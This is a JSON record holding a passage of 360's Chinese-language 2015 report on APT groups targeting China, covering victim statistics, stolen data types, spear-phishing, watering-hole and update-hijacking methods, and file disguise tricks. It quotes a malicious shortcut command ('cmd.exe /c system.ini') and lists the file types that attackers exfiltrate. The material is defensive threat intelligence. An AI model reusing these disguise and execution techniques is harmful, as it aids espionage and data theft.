{
    "id": "3ddd98de-1405-41ad-9093-792e711c3351",
    "created_at": "2022-10-25T16:48:22.703981Z",
    "updated_at": "2025-03-27T02:16:57.914853Z",
    "deleted_at": null,
    "sha1_hash": "1daa7fd401a37b65528f168a9818289fb214d1d1",
    "title": "2015年中国高持续性威胁（APT）研究报告",
    "authors": "",
    "file_creation_date": "2016-01-19T10:19:43Z",
    "file_modification_date": "2016-01-19T10:19:43Z",
    "file_size": 2468990,
    "plain_text": "0\n\n\n-----\n\n# 摘  要\n\n 中国是 APT 攻击的主要受害国，国内多个省、市受到不同程度的影响，其中北京、广\n东是重灾区，行业上科研教育、政府机构是 APT 攻击的重点关注领域。\n\n APT 组织主要目的是窃取机构内的敏感数据，最长已持续 8 年，特别是微软 Office 和\nWPS 等文档文件。\n\n 针对中国的 APT 攻击主要由低成本的攻击组成，相关防御薄弱使低成本攻击频频得手。\n\n 鱼叉攻击和水坑攻击依然是 APT 组织最青睐的攻击方式，其中鱼叉攻击占主流，也发\n现通过硬件设备进行网络劫持的攻击。\n\n 攻击者常常使用漏洞利用技术，意图达到未授权安装执行的目的，不仅如此，漏洞的使\n用还能保证二进制 PE 程序能躲避杀毒软件的检测。攻击组织一般都掌握着或多或少的\n0day 漏洞，不过考虑到成本问题，他们更倾向使用 1day 和 Nday 漏洞展开攻击。\n\n 攻击组织一般通过公开的资源、窃取的数据、以及多组织之间的合作，逐步对被攻击目\n标从了解到掌握。同时，被攻击目标的供应链涉及到多个环节，这些环节往往也成为被\n攻击的目标。\n\n 在 RAT（Remote Access Trojan，远程访问木马）利用方式上，公开 RAT 的利用率呈现下\n降趋势，更倾向自主开发或委托定制的 RAT。\n\n 初始攻击中具有周期性的精确打击逐步成为主流，另外针对非 Windows 操作系统的其\n他平台（如 Mac OS X、Android）的攻击也逐渐浮出水面。\n\n 攻击者常常采用 C&C 域名进行通信控制，其中绝大部分都是动态域名，本报告中所提\n到的 APT 组织所涉及的 C&C 域名，均为境外注册的动态域名服务商。同时，也发现了\n利用云盘存储窃取的数据信息，以及利用第三方博客作为恶意代码的中转平台。\n\n 在初始攻击达到效果进行横向移动的过程中，攻击者偏向利用 Windows 系统自带命令，\n进一步利用 PowerShell、WMI 进行横向移动攻击，不仅如此，第三方工具在横向移动攻\n击中也频繁出现。\n\n 针对中国相关目标群体的攻击手段常常“量身定制”，主要体现在诱饵信息内容制作、\n攻击时间点往往发生在行业会议或国内重大节假日期间。攻击者发送鱼叉邮件主要使用\n国内第三方邮件服务商，通过 Web 邮箱发送。附件压缩包以 RAR 为主。同时，攻击者\n与中国安全厂商进行了大量持续的攻防对抗，特别是针对 360 等安全厂商的安全产品。\n另一方面，所窃取的数据关注 WPS 等中国特有的办公软件，而在注册 C&C 域名的时候，\n更倾向采用具备中国元素的关键字。\n\n APT 攻击发展趋势主要有：APT 组织的攻击目标方面，将会持续以政治、经济、科技、\n军工等热点相关的行业或机构为攻击目标，如十三五规划、一带一路等相关领域，由商\n业竞争产生的 APT 攻击将不断增加，另外针对非 Windows 的攻击出现频率将会持续增\n高；APT 组织的攻击手法方面，安全威胁越来越难“看见”，同时针对安全行业将从被\n动隐匿过渡到主动出击；最后在反 APT 领域，针对中国的 APT 攻击将越来越多的被曝\n光，另外反 APT 领域相关机构厂商将协作防守。\n\n关键词：APT、鱼叉攻击、水坑攻击、0day、C&C、伪装\n\n1\n\n\n-----\n\n# 目  录\n\n### 第一章 本报告的研究方法................................................................................................................ 1\n\n一、 研究对象 ............................................................................................................................... 1\n\n二、 方法思路 ............................................................................................................................... 1\n\n三、 时间范围 ............................................................................................................................... 2\n\n### 第二章 中国是APT 攻击的主要受害国 ..................................................................................... 3\n\n一、 针对中国发动攻击的APT 组织 ............................................................................................. 3\n\n二、 地域分布：北京、广东是重灾区.......................................................................................... 4\n\n三、 行业分布：主要针对科研教育、政府机构领域 ................................................................... 5\n\n四、 造成的危害：长期窃取敏感数据.......................................................................................... 5\n\n（一） 收集基本信息 ................................................................................................................ 6\n\n（二） 窃取敏感数据 ................................................................................................................ 6\n\n（三） 针对移动通信设备 ........................................................................................................ 7\n\n### 第三章 防御薄弱导致低成本入侵频频得手............................................................................. 8\n\n一、 APT 攻击的主要入侵方式 ...................................................................................................... 8\n\n（一） 载荷投递的成本 ............................................................................................................ 8\n\n（二） 突防利用的成本 ............................................................................................................ 8\n\n（三） 小结 ............................................................................................................................... 9\n\n二、 APT 攻击中的载荷投递——邮件和网站 ............................................................................... 9\n\n（一） 鱼叉攻击和水坑攻击依然是APT 组织最青睐的入侵方式 ............................................ 9\n\n（二） 高成本的载荷投递：物理接触 ................................................................................... 11\n\n（三） 利用社工对载荷投递的精心伪装................................................................................ 11\n\n三、 APT 攻击中的突防利用——漏洞 ........................................................................................ 14\n\n（一） APT 组织具备持有0day 漏洞的能力 ........................................................................... 15\n\n（二） APT 组织更倾向使用1day 和Nday .............................................................................. 15\n\n### 第四章 攻击手法的不断演进与蜕变......................................................................................... 17\n\n一、 侦查跟踪：从目标本身到供应链的延伸 ............................................................................ 17\n\n二、 武器构建：从公开RAT 到委托定制 .................................................................................... 18\n\n三、 载荷投递：低成本和周期性 ............................................................................................... 18\n\n四、 突防利用：从Windows 到多种操作系统 ............................................................................ 20\n\n五、 安装植入：无自启动，如何持久？ .................................................................................... 21\n\n六、 通信控制：依托第三方平台隐藏........................................................................................ 22\n\n七、 达成目标：横向移动以扩大战果........................................................................................ 23\n\n### 第五章 APT 攻击为中国本土量身定制 ................................................................................... 26\n\n一、 熟悉目标所属行业领域 ....................................................................................................... 26\n\n二、 掌握目标作业环境 .............................................................................................................. 27\n\n三、 符合目标习惯偏好 .............................................................................................................. 28\n\n2\n\n\n-----\n\n### 第六章 针对中国APT 攻击的趋势预测 .................................................................................. 29\n\n一、 APT 组织的攻击目标 ........................................................................................................... 29\n\n（一） 紧密围绕政治、经济、科技、军工等热点领域及事件 ............................................. 29\n\n（二） 由商业竞争产生的APT 攻击将不断增加 .................................................................... 29\n\n（三） 针对非Windows 的攻击频率持续增高 ........................................................................ 29\n\n二、 APT 组织的攻击手法 ........................................................................................................... 29\n\n（一） APT 攻击越来越难被“看见” .................................................................................... 29\n\n（二） 对安全厂商从被动隐匿到主动出击 ............................................................................ 30\n\n三、 反APT 领域的发展 .............................................................................................................. 30\n\n（一） 更多针对中国的APT 攻击将曝光................................................................................ 30\n\n（二） 反APT 领域的防守协作持续增强................................................................................ 30\n\n### 第七章 本报告涉及的部分APT 组织 ....................................................................................... 31\n\n一、 APT-C-00 组织 ..................................................................................................................... 31\n\n二、 APT-C-05 组织 ..................................................................................................................... 31\n\n三、 APT-C-06 组织 ..................................................................................................................... 31\n\n四、 APT-C-12 组织 ..................................................................................................................... 31\n\n### 360 威胁情报中心............................................................................................................................... 32\n\n 360 天眼实验室（SKYEYE LABS） ............................................................................................ 32\n\n 360 追日团队（HELIOS TEAM） ................................................................................................ 32\n\n3\n\n\n-----\n\n# 第一章 本报告的研究方法\n\n## 一、 研究对象\n\n截至 2015 年 11 月底，360 威胁情报中心监测到的针对中国境内科研教育、政府机构等\n组织机构发动 APT 攻击的境内外黑客组织累计 29 个，其中 15 个 APT 组织曾经被国外安全\n厂商披露过，另外 14 个为 360 独立发现并监测到的 APT 组织。\n\n本报告后续内容主要就 360 首先发现并监控到的 APT 组织进行研究分析，其中相关事\n例主要从 APT-C-00、APT-C-01、APT-C-02、APT-C-05、APT-C-06 和 APT-C-12 这六个典型组织\n中选取。\n\n## 二、 方法思路\n\n\n图 1 洛克希德•马丁公司的“杀伤链”模型1\n\n为了便于读者理解，我们主要基于洛克希德•马丁公司的“杀伤链”模型，进一步从 APT\n组织发起攻击的成本、攻击手法的更新发展和如何适应中国本土环境这三个方面展开研究分\n析。\n\n首先我们从 APT 组织发动攻击行动所需成本进行研究，在攻击成本中我们主要对 APT\n的载体投递手段：邮件（鱼叉攻击）和网站（水坑攻击），APT 攻击中的突防利用手段：已\n知漏洞和 0day 漏洞，这两个方面展开研究分析。套用“杀伤链”模型，鱼叉攻击、水坑攻\n击，已知漏洞、0day 漏洞分别归属于载荷投递（Delivery）和突防利用（Exploitation）这两\n个环节，这两个环节也是完全决定一次攻击行动成功与否的关键。\n\n进一步我们会就 APT 组织的攻击手法进行分析，在“The Pyramid of Pain”[2]中提出了 TTPs\n（Tactics, Techniques and Procedures，战术、技术与步骤），在本报告中可以将攻击手法理解\n为 TTPs，这也是在研究 APT 组织中金字塔顶尖最难发现的部分。就针对中国攻击的 APT 组\n织，我们从武器构建到横向移动，对 APT 生命周期的每个环节进行剖析。\n\n最后我们会就 APT 组织如何适应中国本土环境展开分析，主要从熟悉目标所属行业领\n域、掌握目标作业环境、符合目标习惯偏好这三个方面进行详细介绍，其中将逐一列举针对\n\n1Intelligence-Driven Computer Network Defense Informed by Analysis of Adversary Campaigns and Intrusion Kill\nChains，\nhttp://www.lockheedmartin.com/content/dam/lockheed/data/corporate/documents/LM-White-Paper-Intel-Driv\nen-Defense.pdf\n2“The Pyramid of Pain”，http://detect-respond.blogspot.tw/2013/03/the-pyramid-of-pain.html\n\n1\n\n\n-----\n\n中国的目标群体进行“量身定制”的诸多手法。\n\n## 三、 时间范围\n\n我们主要研究针对国内攻击的 APT 组织在近一年的活跃情况，相关时间范围主要从 2014\n年 12 月 1 日至 2015 年 11 月 30 日。\n\n另外报告中某些观点或结论，需要结合一些非时间范围内的历史数据，进行对比论证或\n介绍。例如：第四章中“三、APT 攻击中的突防利用——漏洞”章节中在介绍 Nday 漏洞，\n会以 CVE-2012-0158 作为典型案例。\n\n2\n\n\n-----\n\n# 第二章 中国是APT 攻击的主要受害国\n\n## 一、 针对中国发动攻击的APT 组织\n\n中国是 APT（Advanced Persistent Threats，高级持续性威胁）攻击的受害国，国内多个\n省、市受到不同程度的影响，其中北京、广东是重灾区，行业上教育科研、政府机构是 APT\n攻击的重点关注领域。\n\n截至 2015 年 11 月底，360 威胁情报中心监测到的针对中国境内科研教育、政府机构等\n组织单位发动 APT 攻击的境内外黑客组织累计 29 个，其中 15 个 APT 组织曾经被国外安全\n厂商披露过，另外 14 个为 360 威胁情报中心首先发现并监测到的 APT 组织，其中包括我们\n在 2015 年 5 月末发布的海莲花（OceanLotus）APT 组织[3]。\n\n监测结果显示，在这 29 个 APT 组织中，针对中国境内目标的攻击最早可以追溯到 2007\n年，而最近三个月（2015 年 9 月以后）内仍然处于活跃状态的 APT 组织至少有 9 个。统计\n显示，仅仅在过去的 12 个月中，这些 APT 组织发动的攻击行动，至少影响了中国境内超过\n万台电脑，攻击范围遍布国内 31 个省级行政区。\n\n另外 2013 年曝光的斯诺登事件，同年 Norman 公布的 HangOver 组织，卡巴斯基在 2014\n年揭露的 Darkhotel 组织和 2015 曝光的方程式组织（Equation Group）等，这些国外安全厂\n商和机构发现的 APT 组织，都直接证明了中国是 APT 攻击中的主要受害国。\n\n本报告中主要就 360 威胁情报中心首先发现并监测到的 APT 组织展开介绍，进一步相\n关数据统计和相关攻击手法，主要就相关 APT 组织在 2015 年活跃情况进行分析。\n\n以下是 360 威胁情报中心监控到的针对中国攻击的部分 APT 组织列表，其中 OceanLotus\n（APT-C-00）、APT-C-05、APT-C-06、APT-C-12 是 360 截获的 APT 组织及行动。\n\n已知最早 监测最近\n\n排序 **APT 组织** **APT 行动** 首先报告厂商\n\n活动时间 活动时间\n\nAPT28、Operation\n\n**1** APT28 FireEye 2007 年 2014 年 7 月\n\nRussianDoll\n\n**2** Darkhotel Darkhotel Kaspersky 2007 年 2015 年 11 月\n\n**3** APT-C-05 APT-C-05 360 2007 年 2015 年 11 月\n\n**4** APT-C-12 APT-C-12 360 2011 年 2015 年 11 月\n\n**5** OceanLotus(APT-C-00) OceanLotus 360 2011 年 2015 年 11 月\n\n**6** APT-C-06 APT-C-06 360 2011 年 2015 年 11 月\n\n**7** Operation Arid Viper Operation Arid Viper Trend Micro 2012 年 2014 年 12 月\n\n**8** Desert Falcon Desert Falcon Kaspersky 2013 年 2014 年 11 月\n\n**9** Carberp Anunak FOX IT 2013 年 2015 年 6 月\n\n**10** ScanBox ScanBox AlienVault 2014 年 2015 年 5 月\n\n表 1 针对中国攻击的部分 APT 组织列表\n\n3海莲花（OceanLotus）APT 组织报告，https://skyeye.360safe.com/\n\n3\n\n|排序|APT 组织|APT 行动|首先报告厂商|已知最早 活动时间|监测最近 活动时间|\n|---|---|---|---|---|---|\n|1|APT28|APT28、Operation RussianDoll|FireEye|2007 年|2014 年7 月|\n|2|Darkhotel|Darkhotel|Kaspersky|2007 年|2015 年11 月|\n|3|APT-C-05|APT-C-05|360|2007 年|2015 年11 月|\n|4|APT-C-12|APT-C-12|360|2011 年|2015 年11 月|\n|5|OceanLotus(APT-C-00)|OceanLotus|360|2011 年|2015 年11 月|\n|6|APT-C-06|APT-C-06|360|2011 年|2015 年11 月|\n|7|Operation Arid Viper|Operation Arid Viper|Trend Micro|2012 年|2014 年12 月|\n|8|Desert Falcon|Desert Falcon|Kaspersky|2013 年|2014 年11 月|\n|9|Carberp|Anunak|FOX IT|2013 年|2015 年6 月|\n|10|ScanBox|ScanBox|AlienVault|2014 年|2015 年5 月|\n\n\n-----\n\n## 二、 地域分布：北京、广东是重灾区\n\n图 2 国内用户受影响情况（2014 年 12 月-2015 年 11 月）\n\n国内受影响量排名前五的省市是：北京、广东、浙江、江苏、福建。除北京以外，受影\n响用户主要分布在沿海相关省市。受影响量排名最后的五个省市是：西藏、青海、宁夏、新\n疆、贵州。（注：本报告中用户数量主要指我们监控到的计算机终端的数量。）\n\n图 3 近一年国内每月遭 APT 攻击用户数量分布\n\n从上图可见，近一年这些我们已知的 APT 组织就攻击了中国境内上万台电脑，平均每\n月超过千台电脑受影响。但随着国外安全厂商的曝光，360 监测到的整体感染量呈现下降趋\n\n4\n\n\n-----\n\n势，原因可能是部分 APT 组织攻击行动暂停、延迟或终止，也可能因为手段更加隐秘躲过\n了 360 的监测。但其他未曝光组织的攻击势态并未收敛，且在最近三个月（2015 年 9 月以\n后）有小幅上升趋势。\n\n## 三、 行业分布：主要针对科研教育、政府机构领域\n\n图 4 APT 组织主要攻击行业分布\n\n从近一年的统计来看，针对科研教育机构发起的攻击次数最多，占到了所有 APT 攻击\n总量的 37.4%；其次是政府机构，占 27.8%；能源企业排第三，占 9.1%。其他被攻击的重要\n领域还包括军事系统、工业系统、商业系统、航天系统和交通系统等。\n\n疑似瞄准安全行业\n\nAPT-C-00 组织将木马构造伪装为 Acunetix Web Vulnerability Scanner（WVS）7 的破解版。\nWVS 是一款主流的 WEB 漏洞扫描软件，相关使用人群主要为网络安全从业人员或相关研究\n人员。攻击组织在选择伪装正常程序的时候选择了 WVS 这款安全软件，也能反映出该组织\n针对的目标对该软件熟悉或感兴趣，进一步我们推测针对的目标很有可能是网络安全从业人\n员、研究人员或者其他黑客组织。\n\n从针对卡巴基斯的 duqu2.0[4]，可以看出针对安全厂商 APT 组织可能会从被动隐匿逐步过\n渡到主动出击。\n\n## 四、 造成的危害：长期窃取敏感数据\n\nAPT 组织主要目的是窃取目标机器内的情报数据，一旦攻击获得成功，首先会收集目标\n机器相关基本信息，进一步会大量窃取目标机器上的敏感数据，如果横向移动达到效果，则\n是窃取目标网络其他机器的敏感数据。本节首先介绍基本信息的收集，之后主要就 APT 组\n织长期窃取敏感数据展开介绍。\n\n4“The Mystery of Duqu 2.0: a sophisticated cyberespionage actor returns”，\nhttps://securelist.com/blog/research/70504/the-mystery-of-duqu-2-0-a-sophisticated-cyberespionage-actor-retu\nrns/\n\n5\n\n\n-----\n\n（一） 收集基本信息\n\n这里主要是指目标机器一旦被成功植入了相应恶意代码，一般恶意代码会自动或者等待\nC&C 指令，将被感染机器的相关基本信息回传，相关信息主要包括以下信息：\n\n1） 主机信息：主要包括操作系统信息、主机名称、本地用户名等；\n\n2） 网络信息：主要包括 IP 地址、网关信息等；\n\n3） 应用程序信息：相关版本信息，主要包括 Microsoft Office 和 Microsoft Internet\n\nExplorer 版本信息；\n\n4） 另外还包括磁盘信息、当前进程信息等。\n\n图 5 窃取的主机基本信息示例（APT-C-05 组织）\n\n攻击者主要依靠相关基本信息来进行初步筛选，包括识别目标机器的真伪（即是否为虚\n拟机或蜜罐），进一步可以判断目标的重要程度。\n\n另外这里的初步探测并收集目标的基本信息，主要在相应机器被首次攻陷后，而不取决\n于具体攻击环节，比如在初始攻击和进一步横向移动都会存在相关探测行为。\n\n（二） 窃取敏感数据\n\nAPT 组织从中国科研、政府机构等领域窃取了大量敏感数据，对国家安全已造成严重的\n危害。其中 APT-C-05 组织是一个针对中国攻击的境外 APT 组织，也是我们至今捕获到针对\n中国攻击持续时间最长的一个组织，该组织主要针对中国政府、军事、科技和教育等重点单\n位和部门，相关攻击行动最早可以追溯到 2007，至今还非常活跃。也就是从 2007 年开始\nAPT-C-05 组织进行了持续 8 年的网络间谍活动。\n\n相关 APT 组织窃取的具体数据内容有很大差异，但均涉及中国科研、政府等领域的敏\n感数据，其中窃取的敏感数据中以具备文件实体形态的文档数据为主，进一步会包括帐号密\n\n6\n\n\n-----\n\n码、截图等，另外针对移动设备的情况在下面会具体介绍。\n\n类型 相关应用软件名称 具体针对的文件扩展名\n\nMicrosoft Office “.doc”、“.docx”、“.ppt”、“.pptx”、“.xls”、“.xlsx”、“.rtf”\n\nWPS Office “.wps”、“.et”、“.dps”\n\n文档类\n\nAdobe Reader “.pdf”\n\n其他 “.txt”\n\n设计图类 AutoCAD “.dwg”\n\n压缩包类 “.rar”、“.zip”、“.7z”\n\n应用类 “.exe”\n\n邮件类 “.eml”\n\n表 2 主要窃取的文件扩展名\n\n上表是窃取的文件类型和具体针对的文件扩展名，不同组织探测窃取的方式不同，如\nAPT-C-05 组织只关注移动存储设备某一个时间段内的文档文件，且相关文件名必须包含指定\n的关键字。而 APT-C-12 组织，则没有太多限制条件，在指定盘符下的所有文档文件都会关\n注，回传之后再进一步甄别。\n\nAPT 组织关注的敏感文档，除了主流的微软 Office 文档，更关注中国本土的 WPS Office\n相关文档，其中 APT-C-05 和 APT-C-12 组织都会关注以“.wps”扩展名的文档，这也是由于\nWPS Office 办公软件的用户一般分布在国内政府机构或事业单位。\n\nAPT 组织长时间潜伏窃取了大量敏感数据是我们可以看到的危害，另外从 APT 组织对目\n标所属行业领域的熟悉、对目标作业环境的掌握，以及符合目标习惯偏好，这些适应中国本\n土化“量身定制”的攻击行动完全做到有的放矢，则让我们更是不寒而栗。相关内容我们在\n“第六章 APT 攻击为中国本土‘量身定制’”章节会进一步详细介绍。\n\n（三） 针对移动通信设备\n\n在 APT 攻击中，除了针对传统 PC 平台，针对移动平台的攻击也越来越多。如智能手机\n等移动通信设备，天生有传统 PC 不具备的资源，如通话记录、短信信息、地理位置信息等。\n\n窃取相关信息 文件方式 **socket 方式** 邮件方式\n\n录音 √ √\n\n拍照 √ √\n\n电话录音 √ √\n\n录像 √ √\n\n通话记录 √\n\n通讯录 √\n\n短信 √\n\n手机基本信息 √\n\n地理位置信息 √\n\n表 3 Android RAT 窃取相关信息列表（APT-C-01 行动）\n\n上表内手机基本信息进一步包括：如 imsi，imei，电话号码，可用内存，屏幕长宽，网\n卡 mac 地址，SD 卡容量等信息。\n\n7\n\n|类型|相关应用软件名称|具体针对的文件扩展名|\n|---|---|---|\n|文档类|Microsoft Office|“.doc”、“.docx”、“.ppt”、“.pptx”、“.xls”、“.xlsx”、“.rtf”|\n||WPS Office|“.wps”、“.et”、“.dps”|\n||Adobe Reader|“.pdf”|\n||其他|“.txt”|\n|设计图类|AutoCAD|“.dwg”|\n|压缩包类||“.rar”、“.zip”、“.7z”|\n|应用类||“.exe”|\n|邮件类||“.eml”|\n\n|窃取相关信息|文件方式|socket 方式|邮件方式|\n|---|---|---|---|\n|录音|√||√|\n|拍照|√||√|\n|电话录音|√|√||\n|录像|√|√||\n|通话记录|||√|\n|通讯录|√|||\n|短信|||√|\n|手机基本信息|||√|\n|地理位置信息|||√|\n\n\n-----\n\n# 第三章 防御薄弱导致低成本入侵频频得手\n\n## 一、 APT 攻击的主要入侵方式\n\n图 6 APT 攻击组织的主要入侵方式\n\n一次 APT 攻击就像军事上针对特定目标的定点打击或间谍渗透，其中很关键的步骤就\n是入侵过程，其中分为所谓的载荷投递与突防利用 。从上图内容看， 鱼叉式钓鱼邮件攻击\n和水坑式攻击属于载荷投递的过程，而漏洞利用就是突防利用的过程。\n\n（一） 载荷投递的成本\n\n从上图最顶端是鱼叉邮件攻击，是 APT 攻击中使用最为频繁的投递载体，攻击者无论\n是发动一次精良的鱼叉邮件攻击，还是普通的刺探邮件，成本是上图这四项中最低的。攻击\n者只需知道目标邮箱地址即可发动一次攻击，当然携带的攻击程序有可能是 PE 二进制可执\n行程序，也可能是漏洞文档，也可能是一个被作为水坑攻击的网站 URL。而针对中国的攻击\n中大多数都是直接携带 PE 二进制可执行程序，这不仅与 APT 组织发动攻击的成本有关系，\n而且与被攻击目标本身的强弱有直接关系。一次 APT 攻击的成功与否主要取决于 APT 组织\n针对目标的意图（Intent）和达到相关意图的能力（Capability），而不取决于目标本身的强与\n弱，目标本身的强弱只是决定了 APT 组织采用的攻击方式。\n\n针对中国的鱼叉邮件攻击主要是携带 PE 二进制可执行程序，这一现象也从侧面反应出\n中国相关目标领域的安全防御措施、以及人员的安全意识比较欠缺。\n\n上图的第二层是水坑式攻击，发动水坑攻击较鱼叉攻击，其成本主要高在需要一个目标\n用户经常关注的网站的权限。水坑攻击中的网站我们也可以理解为一个载体，上面可以放置\nPE 二进制木马（即需要用户交互下载安装执行），也可以放置漏洞文件（即不需要用户交互\n直接下载安装执行）。\n\n（二） 突防利用的成本\n\n上图最底端的两层：已知漏洞和 0day 漏洞，漏洞在 APT 组织中是最为耗费成本的，尤\n其是 0day 漏洞。只有当具备高价值的目标且已知漏洞攻击在目标环境无效，攻击者才会启\n用 0day 漏洞。而在针对中国的攻击中，我们更多看到的是 APT 组织选择如 1day 或 Nday 的\n已知漏洞，但这并不代表 APT 组织不具备持有 0day 漏洞的能力。在 APT-C-00 和 APT-C-05\n\n8\n\n\n-----\n\n组织的攻击中，我们都捕获到了 0day 漏洞，在 APT-C-05 组织发动的 0day 漏洞攻击中，只\n是对特定几个目标发动了攻击，且启用时间很短。\n\n（三） 小结\n\n从对我们已捕获到的 APT 组织中的，载荷投递与突防利用的成本分析，我们可以得出\n以下几点结论：\n\n1） 结合上图鱼叉攻击、水坑攻击、已知漏洞和 0day 漏洞其攻击成本是越来越高，且\n\n成本越高则使用频率越低。\n\n2） APT 组织针对中国的攻击行动一般倾向采用低成本的攻击方案，如鱼叉邮件携带 PE\n\n二进制可执行程序或已知漏洞，只有在高价值目标的出现则会采用高成本的攻击方\n案，如鱼叉邮件携带 0day 漏洞。\n\n3） 针对中国攻击的 APT 组织一般都具备发起高成本攻击的能力，如持有 0day 漏洞；\n\n4） 中国相关目标领域的安全防御措施、以及人员的安全意识整体都比较欠缺。\n\n本章继续会就 APT 攻击中的主要载荷投递：邮件和网站，以及 APT 攻击中的突防利用：\n漏洞，进一步展开详细分析。\n\n## 二、 APT 攻击中的载荷投递——邮件和网站\n\n（一） 鱼叉攻击和水坑攻击依然是APT 组织最青睐的入侵方式\n\n鱼叉式钓鱼邮件攻击和水坑攻击都是 APT 攻击中常用的攻击手法，主要在 APT 的初始\n攻击环节。\n\n图 7 APT 组织相关攻击方式统计\n\n上左图是，基于第三方资源 APTnotes[5]的数据进行相关统计，可以看出大于一半的 APT\n攻击中都采用了鱼叉式攻击。上右图是针对国内的 APT 攻击，可以看出针对国内的 APT 攻\n击更佳倾向采用鱼叉攻击。另外除了主流的鱼叉和水坑攻击以外，我们还捕获到基于即时通\n\n5APTnotes，https://github.com/kbandla/APTnotes\n\n9\n\n\n-----\n\n讯工具、手机短信和网络劫持等初始攻击方式。\n\n1） 鱼叉攻击\n\n图 8 针对科研机构的鱼叉邮件（APT-C-05 组织）\n\nAPT 组织主要以邮件作为投递载体，邮件的标题、正文和附件都可能携带恶意代码。在\n用户提供的原始邮件中，我们分析得出目前主要的方式是附件是漏洞文档、附件是二进制可\n执行程序和正文中包含指向恶意网站的超链接这三种，进一步前两种更为主流。\n\n上图是携带二进制可执行程序，可执行程序多为“.exe”和“.scr”扩展名。一般这类\n可执行程序均进行压缩，以压缩包形态发送。从我们发现的事件中存在极少数采用压缩包加\n密后发送的情况，这种一般通过正文或其他方式将压缩包密码提供给目标用户。\n\n2） 水坑攻击\n\n**APT-C-00 中两种水坑攻击**\n\n替换目标网站可信程序（捆绑即时通、证书驱动） Windows\n\n**A 方式** 对目标网站插入恶意 JS 代码（伪装 Adobe Flash 更新程序） Windows\n\nMac OS X\n\n**B 方式** 替换目标网站指定链接（倾向新闻公告类信息） Windows\n\n表 4 APT-C-00 中两种水坑攻击\n\nA 方式：APT-C-00 组织首先通过渗透入侵的攻击方式非法获得某机构的文档交流服务器\n的控制权，接着，在服务器后台对网站上的“即时通”和“证书驱动”两款软件的正常安装\n文件捆绑了自己的木马程序，之后，当有用户下载并安装即时通或证书驱动软件时，木马就\n有机会得到执行。攻击者还在被篡改的服务器页面中插入了恶意的脚本代码，用户访问网站\n时，会弹出提示更新 Flash 软件，但实际提供的是伪装成 Flash 升级包的恶意程序，用户如\n果不慎下载执行就会中招。\n\n10\n\n|APT-C-00 中两种水坑攻击|Col2|Col3|\n|---|---|---|\n|A 方式|替换目标网站可信程序（捆绑即时通、证书驱动）|Windows|\n||对目标网站插入恶意JS 代码（伪装Adobe Flash 更新程序）|Windows|\n|||Mac OS X|\n|B 方式|替换目标网站指定链接（倾向新闻公告类信息）|Windows|\n\n\n-----\n\nB 方式：APT-C-00 组织入侵网站以后修改了网站的程序，在用户访问公告信息时会被重\n定向到一个攻击者控制的网站，提示下载某个看起来是新闻的文件，比如在新疆 522 暴恐事\n件的第二天网站就提示和暴恐事件相关的新闻，并提供“乌鲁木齐 7 时 50 分发生爆炸致多\n人伤亡.rar”压缩包给用户下载，而该压缩包文件内含的就是 APT-C-00 组织的 RAT。\n\nA 方式和 B 方式前提都是需要获得目标所关注网站的权限，主要区别是 A 方式中恶意代\n码直接放置在被入侵的目标网站服务器上，而 B 方式是篡改替换了网站中的超链接，指向到\n攻击者所控制的第三方网站，也就是恶意代码没有放置在被入侵的目标网站上，而是放置在\n攻击者所拥有的网站服务器上。\n\n（二） 高成本的载荷投递：物理接触\n\nAPT-C-01 组织采用了一种新的攻击方式，通过物理接触的方式，在目标网络环境中部署\n硬件设备，通过中间人的方式劫持用户的网络流量。攻击者是通过劫持替换用户系统中主流\n软件（主要包括 QQ、搜狗输入法等）中的更新程序和微软系统更新程序，达到植入恶意程\n序的目的。\n\n攻击者会判断当更新的目标程序文件扩展名为 exe 可执行文件时，劫持设备会替换正常\n的更新程序为木马。其中大多数情况是替换的恶意程序为独立程序并未捆绑相应正常更新程\n序，但在针对某几种更新程序时，是采用了捆绑的方式，在植入恶意程序的同时也保证了更\n新程序能正常执行。\n\n图 9 利用硬件设备劫持流程示意图（APT-C-01 组织）\n\n一般正常程序在更新和执行的过程中并不会有任何提示，更新过程一般不需要用户操作。\n另外我们还发现大量正常程序在更新的过程中，并不进行更新程序的签名校验、文件校验等\n检查，下载后便会直接执行。\n\n通过中间人劫持的方式来进行攻击，在著名的火焰病毒中也利用劫持微软更新来进行传\n播[6]，但火焰的高明之处除了劫持微软更新，还采用 MD5 碰撞构造虚假签名。\n\n（三） 利用社工对载荷投递的精心伪装\n\n1） 自身伪装\n\n攻击者除了对鱼叉邮件的正文、标题等文字内容精心构造以外，其余大量伪装构造主要\n针对附件文件，尤其是二进制可执行程序。\n\n主要从文件名、文件扩展名和文件图标等方面进行伪装，具体参看下表所示：\n\n6“W32.Flamer: Microsoft Windows Update Man-in-the-Middle”，\nhttp://www.symantec.com/connect/blogs/w32flamer-microsoft-windows-update-man-middle\n\n11\n\n\n-----\n\n|相关伪装项|具体内容|\n|---|---|\n|文件名|1、 与邮件内容、诱饵文档内容相符的文件名。 2、 超长文件名，其目的是隐藏文件扩展名。|\n|文件扩展名|1、 双扩展名，采用 RLO7伪装扩展名。伪装的文档扩展名以“.doc”等 微软office 系列为主，另外伪装的图片扩展名以“.jpg”等为主。 2、 双扩展名，不采用RLO 方式。|\n|文件图标|1、 文档图标，以微软office 系列中的word、excel 文档图标为主。 2、 文件夹图标。 3、 图片图标。|\n\n\n表 5 自身伪装相关具体内容\n\n图 10 RLO 伪装扩展名（APT-C-05 组织）\n\n图 11 超长文件名和文件夹图标（APT-C-12 组织）\n\n图 12 超长文件名和 excel 图标（APT-C-05 组织）\n\n7RLO，http://en.wikipedia.org/wiki/Unicode_character_property\n\n12\n\n\n-----\n\n图 13 伪装 360 软件版本信息和伪装微软系统文件版本信息（APT-C-05 组织）\n\n2） 快捷方式（.lnk）攻击\n\n利用快捷方式（.lnk）攻击是除利用漏洞以外使用最多的一种攻击方式，具体如下：\n\n图 14 快捷方式攻击样本截图（APT-C-02 组织）\n\n13\n\n\n-----\n\n图 15 压缩包解压后相关文件截图（APT-C-02 组织）\n\n从相关攻击事件中来看，这种攻击方式主要还是以邮件为攻击前导，附件是压缩包文件\n（如上图，解压后的文件）。当用户点击相关快捷方式图标（文档或文件夹的），会执行\n“cmd.exe /c system.ini”，其中 system.ini 是可执行木马。这类攻击手法非常具有迷惑性，一\n般用户很难区分压缩包内是否存在恶意可执行程序。\n\n3） 捆绑合法应用程序\n\nAPT 组织除了基于 RAT 本身进行自身伪装以外，还会将 RAT 植入到合法应用程序中，攻\n击者会针对不同的目标群体选择不同的合法应用程序。\n\n**APT 组织名称** 被捆绑的合法应用程序 涉及人群\n\n**APT-C-00** Acunetix Web Vulnerability Scanner（WVS）7 